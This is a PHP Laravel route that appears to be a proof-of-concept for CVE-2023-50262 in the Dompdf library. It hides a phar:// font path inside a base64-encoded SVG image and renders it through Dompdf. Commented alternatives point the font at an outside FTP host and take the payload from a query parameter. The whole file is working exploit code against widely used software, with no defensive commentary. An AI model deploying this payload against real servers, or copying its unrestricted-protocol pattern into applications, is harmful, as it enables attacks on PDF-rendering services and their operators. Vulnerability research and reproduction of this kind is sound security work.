<?php

use Dompdf\Dompdf;
use Illuminate\Support\Facades\Route;

Route::get('/cve_2023_50262', function (Request $request) {

    # $font_name = "baz.phar/test";
    $font_name = "phar:///foo/bar/baz.phar/test";
    # $font_name = "ftp://blakl.is:21/x/y";

    $v1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>";
    $v2 = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" ";
    $v3 = "xmlns=\"http://www.w3.org/2000/svg\" ";
    $v4 = "xmlns:xlink=\"http://www.w3.org/1999/xlink\" ";
    $v5 = "width=\"200\" height=\"200\">";
    $v6 = "<text x=\"20\" y=\"35\" style=\"color:red;font-family:${font_name};\">My</text></svg>";

    $base64_value = base64_encode("$v1$v2$v3$v4$v5$v6");

    $hardcoded_payload = "<html><img src=\"data:image/png;base64,${base64_value}\"></img></html>";

    $dompdf = new Dompdf();
    #$payload = $_GET['payload'];
    $dompdf->loadHtml($hardcoded_payload);
    $dompdf->setPaper('A4', 'landscape');
    $options = $dompdf->getOptions();
    # $options->setAllowedProtocols([]);
    $dompdf->render();
    $dompdf->stream();

    return "DDD 444 111";
});
